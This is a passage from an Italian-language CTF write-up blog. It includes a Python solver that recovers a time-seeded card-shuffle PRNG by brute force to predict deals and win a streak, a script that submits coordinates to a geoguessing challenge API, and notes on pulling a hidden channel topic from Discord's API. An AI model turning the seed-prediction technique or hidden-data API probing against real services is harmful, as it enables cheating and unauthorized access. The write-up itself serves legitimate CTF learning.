</span></span><span class="line"><span class="cl">    <span class="n">line3</span> <span class="o">=</span> <span class="n">lines</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>  <span class="c1"># fourth line (index 3)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts1</span> <span class="o">=</span> <span class="n">line1</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>  <span class="c1"># cards separated by space</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts3</span> <span class="o">=</span> <span class="n">line3</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">cards</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">card_regex_rank</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;‚îÇ(.{1,2})\s</span><span class="si">{3}</span><span class="s1">‚îÇ&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">card_regex_suit</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;‚îÇ\s</span><span class="si">{2}</span><span class="s1">(.)\s</span><span class="si">{2}</span><span class="s1">‚îÇ&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ranks</span> <span class="o">=</span> <span class="n">card_regex_rank</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">line1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">suits</span> <span class="o">=</span> <span class="n">card_regex_suit</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">line3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ranks</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">len</span><span class="p">(</span><span class="n">suits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s1">&#39;Rank/suit count mismatch&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">r</span><span class="p">,</span><span class="n">s</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">ranks</span><span class="p">,</span><span class="n">suits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cards</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">r</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">s</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">cards</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HAND_HEADER</span> <span class="o">=</span> <span class="s1">&#39;Your hand:&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_until_hand</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Action? [b]et / [f]old &gt; &#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Extract portion between &#39;Your hand:&#39; and the prompt</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">HAND_HEADER</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Get last occurrence</span>
</span></span><span class="line"><span class="cl">            <span class="n">idx</span> <span class="o">=</span> <span class="n">text</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="n">HAND_HEADER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">after</span> <span class="o">=</span> <span class="n">text</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">HAND_HEADER</span><span class="p">):]</span>
</span></span><span class="line"><span class="cl">            <span class="n">top_idx</span> <span class="o">=</span> <span class="n">after</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;‚îå&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">top_idx</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="n">hand_block</span> <span class="o">=</span> <span class="n">after</span><span class="p">[</span><span class="n">top_idx</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s1">&#39;Action? [b]et / [f]old &gt;&#39;</span> <span class="ow">in</span> <span class="n">hand_block</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">hand_block</span> <span class="o">=</span> <span class="n">hand_block</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;Action? [b]et / [f]old &gt;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Keep exactly 7 lines</span>
</span></span><span class="line"><span class="cl">            <span class="n">lines</span> <span class="o">=</span> <span class="n">hand_block</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="n">CARD_LINES</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">hand_ascii</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">parse_hand</span><span class="p">(</span><span class="n">hand_ascii</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Parse error, retry:&#39;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;info&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># else keep waiting</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recover_seed</span><span class="p">(</span><span class="n">hands</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">candidates</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">seed</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">MAX_SEED</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">        <span class="n">ok</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="n">hands</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">state</span><span class="p">,</span> <span class="n">deck</span> <span class="o">=</span> <span class="n">shuffle_with_state</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">deck</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">!=</span> <span class="n">target</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">ok</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ok</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">candidates</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">candidates</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>  <span class="c1"># assume unique</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">candidates</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">candidates</span> <span class="k">else</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recover_seed_time_window</span><span class="p">(</span><span class="n">hands</span><span class="p">,</span> <span class="n">center</span><span class="p">,</span> <span class="n">radius</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">total</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">radius</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">off</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="o">-</span><span class="n">radius</span><span class="p">,</span> <span class="n">radius</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">seed</span> <span class="o">=</span> <span class="p">(</span><span class="n">center</span> <span class="o">+</span> <span class="n">off</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">        <span class="n">ok</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="n">hands</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">state</span><span class="p">,</span> <span class="n">deck</span> <span class="o">=</span> <span class="n">shuffle_with_state</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">deck</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">!=</span> <span class="n">target</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">ok</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ok</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">seed</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">predict_next</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span><span class="p">,</span> <span class="n">deck</span> <span class="o">=</span> <span class="n">shuffle_with_state</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">player</span> <span class="o">=</span> <span class="n">deck</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">dealer</span> <span class="o">=</span> <span class="n">deck</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">state</span><span class="p">,</span> <span class="n">player</span><span class="p">,</span> <span class="n">dealer</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">collected</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">HAND_SAMPLES</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">hand</span> <span class="o">=</span> <span class="n">recv_until_hand</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Round </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1"> observed player hand: </span><span class="si">{</span><span class="n">hand</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">collected</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">hand</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;f&#39;</span><span class="p">)</span>  <span class="c1"># fold to preserve streak</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">now_seed</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">windows</span> <span class="o">=</span> <span class="p">[</span><span class="mi">600</span><span class="p">,</span> <span class="mi">3600</span><span class="p">,</span> <span class="mi">6</span><span class="o">*</span><span class="mi">3600</span><span class="p">,</span> <span class="mi">24</span><span class="o">*</span><span class="mi">3600</span><span class="p">]</span>  <span class="c1"># 10m, 1h, 6h, 24h</span>
</span></span><span class="line"><span class="cl">    <span class="n">seed</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">rad</span> <span class="ow">in</span> <span class="n">windows</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[*] Trying seed window +/-</span><span class="si">{</span><span class="n">rad</span><span class="si">}</span><span class="s1">s around 0x</span><span class="si">{</span><span class="n">now_seed</span><span class="si">:</span><span class="s1">06x</span><span class="si">}</span><span class="s1">...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">seed</span> <span class="o">=</span> <span class="n">recover_seed_time_window</span><span class="p">(</span><span class="n">collected</span><span class="p">,</span> <span class="n">now_seed</span><span class="p">,</span> <span class="n">rad</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">seed</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">seed</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Falling back to full 2^24 brute force; this may take time&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">seed</span> <span class="o">=</span> <span class="n">recover_seed</span><span class="p">(</span><span class="n">collected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">elapsed</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">seed</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Seed not found&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Seed recovered: 0x</span><span class="si">{</span><span class="n">seed</span><span class="si">:</span><span class="s1">06x</span><span class="si">}</span><span class="s1"> in </span><span class="si">{</span><span class="n">elapsed</span><span class="si">:</span><span class="s1">.2f</span><span class="si">}</span><span class="s1">s&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">HAND_SAMPLES</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span><span class="p">,</span> <span class="n">_deck</span> <span class="o">=</span> <span class="n">shuffle_with_state</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">streak</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_streak</span> <span class="o">=</span> <span class="mi">30</span>
</span></span><span class="line"><span class="cl">    <span class="n">round_idx</span> <span class="o">=</span> <span class="n">HAND_SAMPLES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">streak</span> <span class="o">&lt;</span> <span class="n">target_streak</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span><span class="p">,</span> <span class="n">predicted_player</span><span class="p">,</span> <span class="n">predicted_dealer</span> <span class="o">=</span> <span class="n">predict_next</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">compare_hands</span><span class="p">(</span><span class="n">predicted_player</span><span class="p">,</span> <span class="n">predicted_dealer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">action</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span> <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="s1">&#39;f&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Predict round </span><span class="si">{</span><span class="n">round_idx</span><span class="si">}</span><span class="s1">: player=</span><span class="si">{</span><span class="n">predicted_player</span><span class="si">}</span><span class="s1"> dealer=</span><span class="si">{</span><span class="n">predicted_dealer</span><span class="si">}</span><span class="s1"> -&gt; result=</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s1"> action=</span><span class="si">{</span><span class="n">action</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Receive actual round hand</span>
</span></span><span class="line"><span class="cl">        <span class="n">actual</span> <span class="o">=</span> <span class="n">recv_until_hand</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">actual</span> <span class="o">!=</span> <span class="n">predicted_player</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Mismatch in prediction, abort.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">action</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">action</span> <span class="o">==</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">streak</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Current streak: </span><span class="si">{</span><span class="n">streak</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">round_idx</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="grass-guesser">Grass-Guesser<a hidden class="anchor" aria-hidden="true" href="#grass-guesser">#</a></h3>
<h4 id="analisi-11">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-11">#</a></h4>
<p>La challenge era un simpatico gioco in stile &ldquo;geoguesser&rdquo; in cui, da una semplice immagine d‚Äôerba, bisognava trovare dove si trovasse quell‚Äôerba nel mondo.
Sarebbe impossibile, se non fosse che il sito, ogni volta che sbagliavi, ti diceva a che distanza eri dal punto reale e aggiungeva il nome della citt√† o del parco coinvolto.</p>
<h5 id="trovare-le-coordinate">Trovare le coordinate<a hidden class="anchor" aria-hidden="true" href="#trovare-le-coordinate">#</a></h5>
<p>Era possibile (come ho fatto) cercare le coordinate approssimative del luogo indicato dal sito e poi aggiustarle in modo che il sito le accettasse.</p>
<h4 id="soluzione-11">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-11">#</a></h4>
<p>La soluzione √® semplice come sembra; la vera difficolt√† era trovare ogni singola coordinata, cosa che si potrebbe probabilmente automatizzare, ma ho preferito farla a mano.</p>
<p>Dopo aver ottenuto tutte le coordinate, le ho inviate una per una al server ottenendo la flag
<code>CTF{53575e231bf06ed00182dcc71ef0e5d1b7d6da577d04ea08add31d8fbfd53722}</code></p>
<h4 id="script-10">Script<a hidden class="anchor" aria-hidden="true" href="#script-10">#</a></h4>
<p>Questo √® lo script effettivo usato per recuperare la flag dal remoto</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s1">&#39;api/start&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sessId</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="s1">&#39;sessionId&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">lats</span> <span class="o">=</span> <span class="p">[</span><span class="mf">51.5074</span><span class="p">,</span><span class="mf">48.8566</span><span class="p">,</span><span class="mf">40.7829</span><span class="p">,</span><span class="o">-</span><span class="mf">33.8688</span><span class="p">,</span><span class="mf">35.6762</span><span class="p">,</span><span class="mf">52.5200</span><span class="p">,</span><span class="mf">41.8902</span><span class="p">,</span><span class="mf">37.7750</span><span class="p">,</span><span class="mf">55.7558</span><span class="p">,</span><span class="mf">1.2897</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">longs</span> <span class="o">=</span> <span class="p">[</span><span class="o">-</span><span class="mf">0.1278</span><span class="p">,</span><span class="mf">2.3521</span><span class="p">,</span><span class="o">-</span><span class="mf">73.9654</span><span class="p">,</span><span class="mf">151.2093</span><span class="p">,</span><span class="mf">139.6503</span><span class="p">,</span><span class="mf">13.4051</span><span class="p">,</span><span class="mf">12.4923</span><span class="p">,</span><span class="o">-</span><span class="mf">122.4194</span><span class="p">,</span><span class="mf">37.6173</span><span class="p">,</span><span class="mf">103.8501</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s1">&#39;api/guess&#39;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;sessionId&#39;</span><span class="p">:</span> <span class="n">sessId</span><span class="p">,</span> <span class="s1">&#39;lat&#39;</span><span class="p">:</span> <span class="n">lats</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">lats</span><span class="p">)],</span> <span class="s1">&#39;lng&#39;</span><span class="p">:</span> <span class="n">longs</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">longs</span><span class="p">)]})</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="s1">&#39;flag&#39;</span><span class="p">])</span>
</span></span></code></pre></div><h3 id="discord-sanity-check">Discord Sanity Check<a hidden class="anchor" aria-hidden="true" href="#discord-sanity-check">#</a></h3>
<h4 id="analisi-12">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-12">#</a></h4>
<p>La challenge non forniva alcun allegato e il solo indizio era la descrizione:</p>
<p><code>Hope you liked our original discord challenge. Now we have a better one :D</code></p>
<p>Ovviamente l‚Äôunico server Discord da analizzare era quello del CTF, con guild id <code>1358683641097621596</code>.</p>
<p>Fatto ci√≤, il flusso per trovare la flag √® stato semplice e ha seguito questi passi:</p>
<ul>
<li>Aprire Discord nel browser ed entrare nel server giusto</li>
<li>Modificare con burp / gestione rete di Firefox una richiesta API.</li>
</ul>
<p>Dopodich√© ho potuto analizzare il server, ipotizzando che non fosse necessaria alcuna interazione per trovare la flag.
Ho quindi aperto le <a href="https://discord.com/developers/docs/resources/guild"><code>API reference di Discord</code></a> e iniziato ad analizzare la guild.</p>
<ul>
<li>Richiesta API a <code>https://discord.com/api/v9/guilds/1358683641097621596</code>, qui niente di interessante a parte alcuni ruoli insoliti.</li>
<li>Richiesta API per vedere tutti i canali (alcuni potrebbero essere nascosti ma condividere comunque informazioni; √® cos√¨ che funziona Discord secondo alcuni documenti online) <code>https://discord.com/api/v9/guilds/1358683641097621596/channels</code></li>
</ul>
<p>Usando l‚Äôultima richiesta sono riuscito a trovare la flag nascosta nel topic di un canale privato <img alt="screenshot della risposta API" loading="lazy" src="/images/discord_sanity.png"></p>
<h3 id="stairway-to-heaven">Stairway To Heaven<a hidden class="anchor" aria-hidden="true" href="#stairway-to-heaven">#</a></h3>
<h4 id="analisi-13">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-13">#</a></h4>
<p>La challenge diceva esplicitamente che una scala del luogo aveva un &ldquo;pezzo di stoffa&rdquo; attaccato; abbiamo girato un minuto e subito dopo abbiamo trovato la flag.</p>
<p><img alt="foto della scala" loading="lazy" src="/images/staircases.png"></p>
<h3 id="love-at-first-bit">Love at first bit<a hidden class="anchor" aria-hidden="true" href="#love-at-first-bit">#</a></h3>
<h4 id="analisi-14">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-14">#</a></h4>
